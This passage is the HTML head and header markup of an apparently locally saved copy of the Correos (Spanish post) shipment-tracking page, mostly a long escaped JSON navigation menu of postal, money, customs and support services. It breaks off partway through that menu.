		<link rel="apple-touch-icon" sizes="167x167" href="/www.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="152x152" href="/www.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="120x120" href="/www.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<meta name="msapplication-square310x310logo" content="/content/dam/correos/imagenes/iconos/CORREOS-favicon.svg">
		<meta name="msapplication-wide310x150logo" content="/content/dam/correos/imagenes/iconos/CORREOS-favicon.svg">
		<meta name="msapplication-square150x150logo" content="/content/dam/correos/imagenes/iconos/CORREOS-favicon.svg">
		<meta name="msapplication-square70x70logo" content="/content/dam/correos/imagenes/iconos/CORREOS-favicon.svg">


		<!-- AEM page model -->



		<meta property="cq:pagemodel_root_url" content="/content/correos/es/es/herramientas/localizador.model.json">

		<!-- CUSTOM Meta AEM page model -->

		<meta name="/content/correos/es/es/herramientas/localizador/envios" content="/es/es/herramientas/localizador/envios">

		<meta name="/content/correos/es/es/herramientas/localizador/envios/detalle" content="/es/es/herramientas/localizador/envios/detalle">
		<script type="text/javascript">
			var digitalData = {};
		</script>

		<link rel="stylesheet" href="./files/css/clientlib-react.min.43091e600ff5d0e3d65a5590bfe00a1d.css" type="text/css">
		<!-- <script async="" src="https://static.hotjar.com/c/hotjar-3295492.js?sv=6"></script> -->
		<link type="text/css" rel="stylesheet" charset="UTF-8" href="./files/css/m=el_main_css.html">
	
	
		<div class="lodingBack" id="lodingBack" style="display: none;">
			<img class="rotate-center" src="./files/img/loading.png" style="margin-top: 100%;" width="40">
		</div>
		<div id="spa-root">
			<div>
				<div class="">
					<div class="aem-container aem-Grid aem-Grid--12 aem-Grid--default--12"></div>
					<div></div>
				</div>
				<div class="">
					<div></div>
				</div>
				<div class="">
					<div class="aem-page correos-page ">
						<div class="">
							<div class="aem-container aem-Grid aem-Grid--12 aem-Grid--default--12">
								<div class="  aem-GridColumn aem-GridColumn--default--12">
									<correos-cdk-core-header fixed="" literals="{&quot;txtSecondaryNavDesc&quot;:&quot;Menú de segundo nivel&quot;,&quot;txtMenuButtonDesc&quot;:&quot;Menú&quot;,&quot;txtPrimaryNavDesc&quot;:&quot;Menú de primer nivel&quot;,&quot;txtLangDesc&quot;:&quot;Selección de idiomas&quot;,&quot;txtGoBack&quot;:&quot;Volver&quot;,&quot;txtGoBackDesc&quot;:&quot;Volver al menú principal&quot;}" modaltitle="Acciones" logosrc="/content/dam/correos/imagenes/ilustraciones/logos/LogoCornamusa.svg" logohref="/es/es/particulares" logotarget="_self" currentlang="es" menulvzero="particular" searchinputlabel="Busca en correos.es" navigation="[{&quot;children&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-home&quot;,&quot;name&quot;:&quot;Inicio&quot;,&quot;id&quot;:&quot;inicio&quot;,&quot;href&quot;:&quot;/es/es/particulares&quot;,&quot;titleLink&quot;:&quot;Inicio&quot;},{&quot;children&quot;:[{&quot;children&quot;:[],&quot;name&quot;:&quot;Localiza tu envío&quot;,&quot;id&quot;:&quot;localiza-tu-envío&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/localiza-tu-envio&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Buzón de vacaciones&quot;,&quot;id&quot;:&quot;buzón-de-vacaciones&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/planifica-tus-entregas/buzon-de-vacaciones&quot;},{&quot;name&quot;:&quot;Reenvío postal&quot;,&quot;id&quot;:&quot;reenvío-postal&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/planifica-tus-entregas/reenvio-postal&quot;},{&quot;name&quot;:&quot;Apartado postal&quot;,&quot;id&quot;:&quot;apartado-postal&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/planifica-tus-entregas/apartado-postal&quot;}],&quot;name&quot;:&quot;Planifica tus entregas&quot;,&quot;id&quot;:&quot;planifica-tus-entregas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Citypaq&quot;,&quot;id&quot;:&quot;citypaq&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/nuestros-puntos-de-entrega-y-recogida/citypaq&quot;},{&quot;name&quot;:&quot;Oficinas de Correos&quot;,&quot;id&quot;:&quot;oficinas-de-correos&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/nuestros-puntos-de-entrega-y-recogida/oficinas-de-correos&quot;}],&quot;name&quot;:&quot;Nuestros puntos de entrega y recogida&quot;,&quot;id&quot;:&quot;nuestros-puntos-de-entrega-y-recogida&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Quiero modificar la entrega&quot;,&quot;id&quot;:&quot;quiero-modificar-la-entrega&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/esperando-la-entrega/quiero-modificar-la-entrega&quot;}],&quot;name&quot;:&quot;Esperando la entrega&quot;,&quot;id&quot;:&quot;esperando-la-entrega&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Recibe muestras gratis en tu buzón&quot;,&quot;id&quot;:&quot;recibe-muestras-gratis-en-tu-buzón&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/recibe-muestras-gratis-en-tu-buzon&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Importación en Península y Baleares&quot;,&quot;id&quot;:&quot;importación-en-península-y-baleares&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/tramitacion-aduanera-en-la-importacion/importacion-en-peninsula-y-baleares&quot;},{&quot;name&quot;:&quot;Importación en Canarias&quot;,&quot;id&quot;:&quot;importación-en-canarias&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/tramitacion-aduanera-en-la-importacion/importacion-en-canarias&quot;},{&quot;name&quot;:&quot;Importación en Ceuta&quot;,&quot;id&quot;:&quot;importación-en-ceuta&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/tramitacion-aduanera-en-la-importacion/importacion-en-ceuta&quot;},{&quot;name&quot;:&quot;Importación en Melilla&quot;,&quot;id&quot;:&quot;importación-en-melilla&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/tramitacion-aduanera-en-la-importacion/importacion-en-melilla&quot;}],&quot;name&quot;:&quot;Tramitación aduanera en la Importación&quot;,&quot;id&quot;:&quot;tramitación-aduanera-en-la-importación&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir/tramitacion-aduanera-en-la-importacion&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-recieve&quot;,&quot;name&quot;:&quot;Recibir&quot;,&quot;id&quot;:&quot;recibir&quot;,&quot;href&quot;:&quot;/es/es/particulares/recibir&quot;,&quot;titleLink&quot;:&quot;Recibir&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Envíos económicos&quot;,&quot;id&quot;:&quot;envíos-económicos&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/envios-economicos&quot;},{&quot;name&quot;:&quot;Envíos rápidos&quot;,&quot;id&quot;:&quot;envíos-rápidos&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/envio-rapido&quot;},{&quot;name&quot;:&quot;Paq Frío&quot;,&quot;id&quot;:&quot;paq-frío&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/paq-frio&quot;},{&quot;name&quot;:&quot;Burofax y cartas&quot;,&quot;id&quot;:&quot;burofax-y-cartas&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/burofax-cartas&quot;},{&quot;name&quot;:&quot;Paq Maleta&quot;,&quot;id&quot;:&quot;paq-maleta&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/paq-maleta&quot;},{&quot;name&quot;:&quot;Envío de bicicletas&quot;,&quot;id&quot;:&quot;envío-de-bicicletas&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales/envio-de-bicicletas&quot;}],&quot;name&quot;:&quot;Envíos nacionales&quot;,&quot;id&quot;:&quot;envíos-nacionales&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/envios-nacionales&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Paquetes al extranjero&quot;,&quot;id&quot;:&quot;paquetes-al-extranjero&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/enviar-al-extranjero/paquetes-al-extranjero&quot;},{&quot;name&quot;:&quot;Documentos al extranjero&quot;,&quot;id&quot;:&quot;documentos-al-extranjero&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/enviar-al-extranjero/documentos-al-extranjero&quot;},{&quot;name&quot;:&quot;Zonas internacionales&quot;,&quot;id&quot;:&quot;zonas-internacionales&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/enviar-al-extranjero/zonas-internacionales&quot;},{&quot;name&quot;:&quot;Gestión aduanera de exportación&quot;,&quot;id&quot;:&quot;gestión-aduanera-de-exportación&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/enviar-al-extranjero/gestion-aduanera-de-exportacion&quot;}],&quot;name&quot;:&quot;Enviar al extranjero&quot;,&quot;id&quot;:&quot;enviar-al-extranjero&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/enviar-al-extranjero&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Línea Bosques&quot;,&quot;id&quot;:&quot;línea-bosques&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/sobre-y-embalajes/linea-bosques&quot;},{&quot;name&quot;:&quot;Prefanqueados&quot;,&quot;id&quot;:&quot;prefanqueados&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/sobre-y-embalajes/prefanqueados&quot;},{&quot;name&quot;:&quot;Sobres y embalajes&quot;,&quot;id&quot;:&quot;sobres-y-embalajes&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/sobre-y-embalajes/sobres-y-embalajes&quot;}],&quot;name&quot;:&quot;Sobre y embalajes&quot;,&quot;id&quot;:&quot;sobre-y-embalajes&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/sobre-y-embalajes&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Portal de devoluciones&quot;,&quot;id&quot;:&quot;portal-de-devoluciones&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/devolver-un-paquete/portal-de-devoluciones&quot;},{&quot;name&quot;:&quot;Devuelve con Citypaq&quot;,&quot;id&quot;:&quot;devuelve-con-citypaq&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/devolver-un-paquete/devuelve-con-citypaq&quot;}],&quot;name&quot;:&quot;Devolver un paquete&quot;,&quot;id&quot;:&quot;devolver-un-paquete&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Comprar Sellos&quot;,&quot;id&quot;:&quot;comprar-sellos&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar/comprar-sellos&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-send&quot;,&quot;name&quot;:&quot;Enviar&quot;,&quot;id&quot;:&quot;enviar&quot;,&quot;href&quot;:&quot;/es/es/particulares/enviar&quot;,&quot;titleLink&quot;:&quot;Enviar&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Giro Internacional&quot;,&quot;id&quot;:&quot;giro-internacional&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/envio-de-dinero/giro-internacional&quot;},{&quot;name&quot;:&quot;Western Union&quot;,&quot;id&quot;:&quot;western-union&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/envio-de-dinero/western-union&quot;},{&quot;name&quot;:&quot;Giro Nacional&quot;,&quot;id&quot;:&quot;giro-nacional&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/envio-de-dinero/giro-nacional&quot;}],&quot;name&quot;:&quot;Envío de dinero&quot;,&quot;id&quot;:&quot;envío-de-dinero&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/envio-de-dinero&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Tarjeta Correos Prepago&quot;,&quot;id&quot;:&quot;tarjeta-correos-prepago&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/lleva-el-control-de-tu-dinero-y-tus-gastos/tarjeta-correos-prepago&quot;},{&quot;name&quot;:&quot;Correos Cash&quot;,&quot;id&quot;:&quot;correos-cash&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/lleva-el-control-de-tu-dinero-y-tus-gastos/correos-cash&quot;},{&quot;name&quot;:&quot;Cambio de divisas a domicilio&quot;,&quot;id&quot;:&quot;cambio-de-divisas-a-domicilio&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/lleva-el-control-de-tu-dinero-y-tus-gastos/cambio-de-divisas-a-domicilio&quot;}],&quot;name&quot;:&quot;Lleva el control de tu dinero y tus gastos&quot;,&quot;id&quot;:&quot;lleva-el-control-de-tu-dinero-y-tus-gastos&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Compra en Correos Market&quot;,&quot;id&quot;:&quot;compra-en-correos-market&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/compra-en-correos-market&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Premios ONCE&quot;,&quot;id&quot;:&quot;premios-once&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras/disponible-en-oficinas/premios-once&quot;}],&quot;name&quot;:&quot;Disponible en oficinas&quot;,&quot;id&quot;:&quot;disponible-en-oficinas&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-shopping&quot;,&quot;name&quot;:&quot;Dinero y compras&quot;,&quot;id&quot;:&quot;dinero-y-compras&quot;,&quot;href&quot;:&quot;/es/es/particulares/dinero-y-compras&quot;,&quot;titleLink&quot;:&quot;Dinero y compras&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Transporte de mochilas&quot;,&quot;id&quot;:&quot;transporte-de-mochilas&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/haz-el-camino-de-santiago-con-correos/transporte-de-mochilas&quot;},{&quot;name&quot;:&quot;Envío de maletas&quot;,&quot;id&quot;:&quot;envío-de-maletas&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/haz-el-camino-de-santiago-con-correos/envio-de-maletas&quot;},{&quot;name&quot;:&quot;Consigna en Santiago&quot;,&quot;id&quot;:&quot;consigna-en-santiago&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/haz-el-camino-de-santiago-con-correos/consigna-en-santiago&quot;},{&quot;name&quot;:&quot;Tarjeta Correos Prepago para el Camino de Santiago&quot;,&quot;id&quot;:&quot;tarjeta-correos-prepago-para-el-camino-de-santiago&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/haz-el-camino-de-santiago-con-correos/tarjeta-correos-prepago-para-el-camino-de-santiago&quot;}],&quot;name&quot;:&quot;Haz el Camino de Santiago con Correos&quot;,&quot;id&quot;:&quot;haz-el-camino-de-santiago-con-correos&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/haz-el-camino-de-santiago-con-correos&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Entradas y viajes&quot;,&quot;id&quot;:&quot;entradas-y-viajes&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/entradas-y-viajes&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Sellos y Filatelia&quot;,&quot;id&quot;:&quot;sellos-y-filatelia&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes/sellos-y-filatelia&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-leisure&quot;,&quot;name&quot;:&quot;Viajes, Ocio y Filatelia&quot;,&quot;id&quot;:&quot;viajes,-ocio-y-filatelia&quot;,&quot;href&quot;:&quot;/es/es/particulares/ocio-y-viajes&quot;,&quot;titleLink&quot;:&quot;Viajes, Ocio y Filatelia&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Servicios ORVE&quot;,&quot;id&quot;:&quot;servicios-orve&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/tramites-con-la-administracion-publica/servicios-orve&quot;},{&quot;name&quot;:&quot;Buzón  Digital &quot;,&quot;id&quot;:&quot;buzón--digital-&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/tramites-con-la-administracion-publica/buzon-digital&quot;}],&quot;name&quot;:&quot;Trámites con la Administración Pública&quot;,&quot;id&quot;:&quot;trámites-con-la-administración-pública&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Pago de recibos&quot;,&quot;id&quot;:&quot;pago-de-recibos&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/pago-de-recibos&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Distintivo medioambiental&quot;,&quot;id&quot;:&quot;distintivo-medioambiental&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt/distintivo-medioambiental&quot;},{&quot;name&quot;:&quot;Informes de vehículos&quot;,&quot;id&quot;:&quot;informes-de-vehículos&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt/informes-de-vehiculos&quot;},{&quot;name&quot;:&quot;Duplicado permiso circulación&quot;,&quot;id&quot;:&quot;duplicado-permiso-circulación&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt/duplicado-permiso-circulacion&quot;},{&quot;name&quot;:&quot;Cambio de Titularidad&quot;,&quot;id&quot;:&quot;cambio-de-titularidad&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt/cambio-de-titularidad&quot;},{&quot;name&quot;:&quot;Notificación de venta de un vehículo&quot;,&quot;id&quot;:&quot;notificación-de-venta-de-un-vehículo&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt/notificacion-de-venta-de-un-vehiculo&quot;}],&quot;name&quot;:&quot;Servicios de la DGT&quot;,&quot;id&quot;:&quot;servicios-de-la-dgt&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/servicios-de-la-dgt&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Tramites de la Agencia Tributaria&quot;,&quot;id&quot;:&quot;tramites-de-la-agencia-tributaria&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/tramites-de-la-agencia-tributaria&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;ConnectedLife Pets&quot;,&quot;id&quot;:&quot;connectedlife-pets&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano/connectedlife-pets&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-communications&quot;,&quot;name&quot;:&quot;Para el ciudadano&quot;,&quot;id&quot;:&quot;para-el-ciudadano&quot;,&quot;href&quot;:&quot;/es/es/particulares/para-el-ciudadano&quot;,&quot;titleLink&quot;:&quot;Para el ciudadano&quot;}],&quot;name&quot;:&quot;Particular&quot;,&quot;id&quot;:&quot;particular&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;children&quot;:[],&quot;name&quot;:&quot;Localizador de envíos&quot;,&quot;id&quot;:&quot;localizador-de-envíos&quot;,&quot;href&quot;:&quot;/es/es/herramientas/localizador&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Oficinas, buzones y Citypaq&quot;,&quot;id&quot;:&quot;oficinas,-buzones-y-citypaq&quot;,&quot;href&quot;:&quot;/es/es/herramientas/oficinas-buzones-citypaq&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Buscador Códigos Postales&quot;,&quot;id&quot;:&quot;buscador-códigos-postales&quot;,&quot;href&quot;:&quot;/es/es/herramientas/codigos-postales&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Formulario online de envíos de oficina&quot;,&quot;id&quot;:&quot;formulario-online-de-envíos-de-oficina&quot;,&quot;href&quot;:&quot;/es/es/herramientas/formulario-online-de-envios-de-oficina&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Gestión de estacionados&quot;,&quot;id&quot;:&quot;gestión-de-estacionados&quot;,&quot;href&quot;:&quot;/es/es/herramientas/gestion-de-estacionados&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Cotejo&quot;,&quot;id&quot;:&quot;cotejo&quot;,&quot;href&quot;:&quot;/es/es/herramientas/cotejo&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;ADT Postales&quot;,&quot;id&quot;:&quot;adt-postales&quot;,&quot;href&quot;:&quot;/es/es/herramientas/adt-postales&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-settings&quot;,&quot;name&quot;:&quot;Herramientas&quot;,&quot;id&quot;:&quot;herramientas&quot;,&quot;href&quot;:&quot;/es/es/herramientas&quot;,&quot;titleLink&quot;:&quot;Herramientas&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-pago_card&quot;,&quot;name&quot;:&quot;Tarifas&quot;,&quot;id&quot;:&quot;tarifas&quot;,&quot;href&quot;:&quot;/es/es/tarifas&quot;,&quot;titleLink&quot;:&quot;Tarifas&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-news&quot;,&quot;name&quot;:&quot;Actualidad&quot;,&quot;id&quot;:&quot;actualidad&quot;,&quot;href&quot;:&quot;/es/es/actualidad&quot;,&quot;titleLink&quot;:&quot;Actualidad&quot;},{&quot;relatedModal&quot;:&quot;&quot;,&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-cart&quot;,&quot;name&quot;:&quot;Tienda&quot;,&quot;id&quot;:&quot;tienda&quot;,&quot;href&quot;:&quot;https://market.correos.es/category/correos&quot;,&quot;titleLink&quot;:&quot;Tienda&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Cómo preparar el envío&quot;,&quot;id&quot;:&quot;cómo-preparar-el-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/como-preparar-envio&quot;},{&quot;name&quot;:&quot;Cómo funciona Mi Oficina&quot;,&quot;id&quot;:&quot;cómo-funciona-mi-oficina&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/como-funciona-mi-oficina&quot;},{&quot;name&quot;:&quot;Dimensiones y pesos&quot;,&quot;id&quot;:&quot;dimensiones-y-pesos&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/dimensiones-y-pesos&quot;},{&quot;name&quot;:&quot;Tratamiento de tus datos&quot;,&quot;id&quot;:&quot;tratamiento-de-tus-datos&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/tratamiento-de-tus-datos&quot;},{&quot;name&quot;:&quot;Sellos y franqueo&quot;,&quot;id&quot;:&quot;sellos-y-franqueo&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/sellos-y-franqueo&quot;}],&quot;name&quot;:&quot;Enviar&quot;,&quot;id&quot;:&quot;enviar&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Recoger envío&quot;,&quot;id&quot;:&quot;recoger-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/recoger-envio&quot;},{&quot;name&quot;:&quot;Código de envío&quot;,&quot;id&quot;:&quot;código-de-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/codigo-de-envio&quot;},{&quot;name&quot;:&quot;Aviso de llegada&quot;,&quot;id&quot;:&quot;aviso-de-llegada&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/aviso-de-llegada&quot;},{&quot;name&quot;:&quot;Envíos estacionados&quot;,&quot;id&quot;:&quot;envíos-estacionados&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/envios-estacionados&quot;},{&quot;name&quot;:&quot;Incidencias&quot;,&quot;id&quot;:&quot;incidencias&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/incidencias&quot;}],&quot;name&quot;:&quot;Recibir&quot;,&quot;id&quot;:&quot;recibir&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Correos ID&quot;,&quot;id&quot;:&quot;correos-id&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/otras-consultas/correos-id&quot;}],&quot;name&quot;:&quot;Otras consultas&quot;,&quot;id&quot;:&quot;otras-consultas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/otras-consultas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;DUA Importación&quot;,&quot;id&quot;:&quot;dua-importación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/dua-importacion&quot;},{&quot;name&quot;:&quot;DUA Exportación&quot;,&quot;id&quot;:&quot;dua-exportación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/dua-exportacion&quot;},{&quot;name&quot;:&quot;Brexit, importación y exportación con el Reino Unido&quot;,&quot;id&quot;:&quot;brexit,-importación-y-exportación-con-el-reino-unido&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/brexit&quot;},{&quot;name&quot;:&quot;Nuevo Proceso de Seguridad de Importación&quot;,&quot;id&quot;:&quot;nuevo-proceso-de-seguridad-de-importación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/nuevo-proceso-seguridad-importacion&quot;},{&quot;name&quot;:&quot;IVA de importación en el Comercio Electrónico &quot;,&quot;id&quot;:&quot;iva-de-importación-en-el-comercio-electrónico-&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/iva-de-importacion-en-el-comercio-electronico&quot;}],&quot;name&quot;:&quot;Información aduanera&quot;,&quot;id&quot;:&quot;información-aduanera&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Nacionales&quot;,&quot;id&quot;:&quot;nacionales&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias/nacionales&quot;},{&quot;name&quot;:&quot;Internacionales&quot;,&quot;id&quot;:&quot;internacionales&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias/internacionales&quot;}],&quot;name&quot;:&quot;Coberturas y garantías&quot;,&quot;id&quot;:&quot;coberturas-y-garantías&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Tarifas&quot;,&quot;id&quot;:&quot;tarifas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tarifas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Tratamiento de las incidencias/reclamaciones/consultas&quot;,&quot;id&quot;:&quot;tratamiento-de-las-incidencias/reclamaciones/consultas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/tratamiento-de-las-incidencias-reclamaciones-consultas&quot;},{&quot;name&quot;:&quot;Da de alta tu incidencia/ reclamación&quot;,&quot;id&quot;:&quot;da-de-alta-tu-incidencia/-reclamación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/da-de-alta-tu-incidencia-reclamacion&quot;},{&quot;name&quot;:&quot;Modifica o amplia información&quot;,&quot;id&quot;:&quot;modifica-o-amplia-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/modifica-o-amplia-informacion&quot;},{&quot;name&quot;:&quot;Conoce el estado de tu incidencia&quot;,&quot;id&quot;:&quot;conoce-el-estado-de-tu-incidencia&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/conoce-el-estado-de-tu-incidencia&quot;},{&quot;name&quot;:&quot;Solicita información&quot;,&quot;id&quot;:&quot;solicita-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/solicita-informacion&quot;}],&quot;name&quot;:&quot;Tu consulta/ tu reclamación&quot;,&quot;id&quot;:&quot;tu-consulta/-tu-reclamación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Phishing&quot;,&quot;id&quot;:&quot;phishing&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/phishing&quot;},{&quot;name&quot;:&quot;Qué hace Correos por tu seguridad&quot;,&quot;id&quot;:&quot;qué-hace-correos-por-tu-seguridad&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/que-hace-correos-por-tu-seguridad&quot;},{&quot;name&quot;:&quot;Decálogo de seguridad&quot;,&quot;id&quot;:&quot;decálogo-de-seguridad&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/decalogo-de-seguridad&quot;},{&quot;name&quot;:&quot;Verificador de email&quot;,&quot;id&quot;:&quot;verificador-de-email&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/verificador-de-email&quot;}],&quot;name&quot;:&quot;Seguridad de la 